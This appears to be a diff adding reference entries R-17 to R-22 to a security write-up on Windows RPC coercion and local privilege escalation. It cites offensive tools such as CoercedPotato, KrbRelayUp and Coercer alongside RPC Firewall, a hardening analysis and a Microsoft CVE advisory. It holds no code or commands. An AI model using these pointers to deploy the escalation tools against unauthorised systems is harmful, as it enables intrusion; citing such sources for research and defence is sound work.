+[R-17] *CoercedPotato — DCOM/RPC Local Coercion LPE* — hackvens — https://github.com/hackvens/CoercedPotato
+
+[R-18] *KrbRelayUp — Kerberos Relay from SYSTEM Service* — Dec0ne — https://github.com/Dec0ne/KrbRelayUp
+
+[R-19] *RPC Firewall 2.0 — RPC Call Filtering and Monitoring* — Zero Networks — https://github.com/zeronetworks/RPC-Firewall
+
+[R-20] *Windows Server 2025 Named Pipe and ALPC Hardening Analysis* — SpecterOps / MDSec Research, 2024 — https://posts.specterops.io/
+
+[R-21] *MS-EVEN6 EventLog RPC Coercion* — p0dalirius — included in Coercer v2+ documentation at https://github.com/p0dalirius/Coercer
+
+[R-22] *CVE-2024-26229 — Windows CSC Service RPC LPE* — Microsoft Security Response Center, March 2024 — https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-26229
